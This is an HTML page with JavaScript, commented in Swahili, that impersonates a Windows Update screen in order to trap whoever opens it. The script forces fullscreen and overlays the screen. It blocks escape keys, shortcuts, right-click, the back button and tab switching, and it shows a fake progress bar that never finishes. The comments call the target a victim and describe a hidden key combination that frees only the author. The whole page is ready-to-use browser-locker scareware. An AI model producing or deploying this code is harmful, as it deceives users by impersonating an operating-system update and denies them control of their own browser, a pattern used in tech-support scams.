 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Windows Update</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  html, body {
    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    height: 100%;
    width: 100%;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
    cursor: wait;
    user-select: none;
    -webkit-user-select: none;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    z-index: 999999;
  }

  /* ===== LOCK OVERLAY =====
     Hii inazuia user kubonyeza chochote nje ya page yetu */
  #lockOverlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: transparent;
    z-index: 9999999;
    display: none;  /* Inaonekana tu baada ya kujaribu kutoka */
  }

  .container {
    text-align: center;
    max-width: 600px;
    padding: 40px;
    z-index: 1;
  }

  .logo {
    width: 80px;
    height: 80px;
    margin: 0 auto 30px auto;
    background: rgba(255, 255, 255, 0.15);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 48px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.05); opacity: 0.8; }
  }

  h1 {
    font-size: 36px;
    font-weight: 300;
    margin-bottom: 10px;
    letter-spacing: 0.5px;
  }

  .subtitle {
    font-size: 16px;
    color: rgba(255, 255, 255, 0.7);
    margin-bottom: 40px;
  }

  .progress-container {
    width: 100%;
    max-width: 480px;
    margin: 0 auto;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 12px;
    height: 14px;
    overflow: hidden;
    position: relative;
  }

  .progress-bar {
    height: 100%;
    width: 3%;
    background: linear-gradient(90deg, #4db8ff, #7ac4ff);
    border-radius: 12px;
    transition: width 0.5s ease;
    position: relative;
  }

  .progress-bar::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
    animation: shimmer 2s infinite;
  }

  @keyframes shimmer {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }

  .progress-label {
    font-size: 14px;
    color: rgba(255, 255, 255, 0.8);
    margin-top: 12px;
    font-family: 'Segoe UI', monospace;
  }

  .info-text {
    font-size: 13px;
    color: rgba(255, 255, 255, 0.5);
    margin-top: 50px;
    line-height: 1.6;
  }

  .spinner-container {
    margin: 30px auto 0;
    display: flex;
    justify-content: center;
    gap: 8px;
  }

  .dot {
    width: 10px;
    height: 10px;
    background: rgba(255, 255, 255, 0.4);
    border-radius: 50%;
    animation: dotPulse 1.5s infinite ease-in-out;
  }

  .dot:nth-child(2) { animation-delay: 0.2s; }
  .dot:nth-child(3) { animation-delay: 0.4s; }

  @keyframes dotPulse {
    0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
    40% { transform: scale(1); opacity: 1; }
  }

  .restart-notice {
    margin-top: 25px;
    font-size: 13px;
    color: rgba(255, 255, 255, 0.35);
    animation: fadeInOut 4s infinite;
  }

  @keyframes fadeInOut {
    0%, 100% { opacity: 0.35; }
    50% { opacity: 0.7; }
  }
</style>
</head>
<body>

<div id="lockOverlay"></div>

<div class="container">
  <div class="logo">⚙️</div>
  <h1>Installing updates</h1>
  <p class="subtitle">Please wait a moment</p>

  <div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
  </div>
  <div class="progress-label" id="progressLabel">3%</div>

  <div class="spinner-container">
    <div class="dot"></div>
    <div class="dot"></div>
    <div class="dot"></div>
  </div>

  <p class="info-text">
    Your device may restart several times.<br>
    <strong>Do not turn off your device.</strong>
  </p>

  <p class="restart-notice" id="restartNotice">
    ⏳ Checking for updates...
  </p>
</div>

<script>
// =============================================================
// FULLSCREEN TRAP — LEVEL 10 (MAXIMUM)
// =============================================================

// 1. TUNAINGIA FULLSCREEN MARA MOJA (pop-up mode)
function goFullscreen() {
  const el = document.documentElement;
  const methods = [
    () => el.requestFullscreen ? el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {}) : null,
    () => el.webkitRequestFullscreen ? el.webkitRequestFullscreen() : null,
    () => el.msRequestFullscreen ? el.msRequestFullscreen() : null,
    () => el.mozRequestFullScreen ? el.mozRequestFullScreen() : null
  ];
  methods.forEach(fn => fn());
}

// 2. KAMA FULLSCREEN HAIFANYI KAZI — TUMIA OVERLAY
// Hii inafunika skrini nzima kwa kutumia DIV kubwa
function overlayLock() {
  const overlay = document.getElementById('lockOverlay');
  overlay.style.display = 'block';
  overlay.style.position = 'fixed';
  overlay.style.top = '0';
  overlay.style.left = '0';
  overlay.style.width = '100vw';
  overlay.style.height = '100vh';
  overlay.style.background = 'linear-gradient(135deg, #005a9e 0%, #003f6b 100%)';
  overlay.style.zIndex = '9999999';
  overlay.style.cursor = 'wait';
}

// 3. ZUIA NJIA ZOTE ZA KUTOROKA

// a) BLOCK KEYBOARD NJIA ZOTE
document.addEventListener('keydown', function(e) {
  // Orodha ya keys zote za kutoroka
  const blockKeys = {
    'Escape': true,
    'F11': true,
    'F5': true,
    'F12': true,
    'ContextMenu': true
  };

  const blockCodes = [27, 122, 116, 123, 18, 9, 91, 92, 93];

  if (blockKeys[e.key] || blockCodes.includes(e.keyCode)) {
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    return false;
  }

  // Ctrl+ combinations
  if (e.ctrlKey) {
    const combos = ['w', 'q', 'r', 't', 'n', 's', 'u', 'd', 'f'];
    if (combos.includes(e.key.toLowerCase())) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }

  // Alt+ combinations
  if (e.altKey) {
    const altCombos = ['F4', 'Tab', 'd', 'f', 'e'];
    if (altCombos.includes(e.key)) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }
});

// b) BLOCK RIGHT CLICK
document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
  return false;
});

// c) BLOCK TEXT SELECTION
document.addEventListener('selectstart', function(e) {
  e.preventDefault();
  return false;
});

// d) BLOCK DRAG
document.addEventListener('dragstart', function(e) {
  e.preventDefault();
  return false;
});

// e) BLOCK COPY/CUT
document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
document.addEventListener('cut', function(e) { e.preventDefault(); return false; });

// f) ZUIA BACK BUTTON (browser back)
history.pushState(null, null, location.href);
window.addEventListener('popstate', function() {
  history.pushState(null, null, location.href);
});

// g) ZUIA MWATHIRIKA KUFUNGA TAB
window.addEventListener('beforeunload', function(e) {
  e.preventDefault();
  e.returnValue = 'Windows Update in progress. Do not close this tab.';
});

// h) ZUIA MWATHIRIKA KUBADILISHA TAB
document.addEventListener('visibilitychange', function() {
  if (document.hidden) {
    setTimeout(function() {
      window.focus();
      goFullscreen();
    }, 10);
  }
});

// i) ZUIA ALT+TAB (kurudi kwa window nyingine)
window.addEventListener('blur', function() {
  setTimeout(function() {
    window.focus();
  }, 10);
});

// j) KAMA FULLSCREEN INAISHI — INGANIA TENA
function checkFullscreen() {
  if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
    goFullscreen();
    overlayLock();
  }
}

document.addEventListener('fullscreenchange', checkFullscreen);
document.addEventListener('webkitfullscreenchange', checkFullscreen);
document.addEventListener('mozfullscreenchange', checkFullscreen);

// 4. FAKE PROGRESS (haifikii 100%)
let percent = 3;
let phase = 0;

const messages = [
  '⏳ Checking for updates...',
  '📦 Downloading update 1 of 3...',
  '⚙️ Applying updates...',
  '🔄 Configuring system settings...',
  '📦 Downloading update 2 of 3...',
  '🔧 Installing component updates...',
  '📦 Downloading update 3 of 3...',
  '⚙️ Finalizing installation...',
  '🔄 Preparing for restart...',
  '⏳ Please wait...',
  '📦 Installing update for Windows...',
  '🔒 Applying security patches...',
  '⚠️ Do not restart your PC',
  '🔄 Configuring Windows Update...',
  '✅ Almost done...',
  '⏳ Applying final settings...',
  '🔧 Optimizing system performance...'
];

function updateProgress() {
  phase++;

  if (phase < 10) percent = 3 + (phase * 1.5);
  else if (phase < 25) percent = 16 + ((phase - 10) * 1.2);
  else if (phase < 45) percent = 34 + ((phase - 25) * 1.0);
  else if (phase < 65) percent = 54 + ((phase - 45) * 0.8);
  else if (phase < 90) percent = 70 + ((phase - 65) * 0.6);
  else if (phase < 130) percent = 85 + ((phase - 90) * 0.3);
  else percent = 99;

  if (percent > 99) percent = 99;

  document.getElementById('progressBar').style.width = percent + '%';
  document.getElementById('progressLabel').textContent = Math.floor(percent) + '%';

  const msgIndex = Math.min(Math.floor(phase / 8), messages.length - 1);
  document.getElementById('restartNotice').textContent = messages[msgIndex];

  let delay = 1000;
  if (phase > 20) delay = 1500;
  if (phase > 40) delay = 2500;
  if (phase > 60) delay = 3500;
  if (phase > 90) delay = 5000;
  if (phase > 120) delay = 7000;

  setTimeout(updateProgress, delay);
}

// 5. BACKDOOR YAKO (WEWE PEKEE) — Njama ya kutoroka
// Bonyeza: Ctrl + Shift + X
document.addEventListener('keydown', function(e) {
  if (e.ctrlKey && e.shiftKey && e.key === 'X') {
    // Ondoa overlay
    document.getElementById('lockOverlay').style.display = 'none';
    // Toka fullscreen
    if (document.exitFullscreen) document.exitFullscreen();
    else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
    else if (document.msExitFullscreen) document.msExitFullscreen();
    // Nenda kwenye page nyeupe
    window.location.href = 'about:blank';
    return true;
  }
});

// ===== A N Z A =====
setTimeout(function() {
  goFullscreen();
  // Kama fullscreen haifanyi kazi (baada ya sek 1) → tumia overlay
  setTimeout(function() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
      overlayLock();
    }
  }, 1000);
  updateProgress();
}, 500);

// Angalia fullscreen kila sek 1
setInterval(function() {
  if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
    goFullscreen();
    overlayLock();
  }
}, 1000);

console.log('%c🔧 Windows Update in progress...', 'font-size: 20px; color: #4db8ff;');
console.log('%c⚠️ Do not close this tab.', 'font-size: 16px; color: #ff6666;');
</script>
</body>
</html>
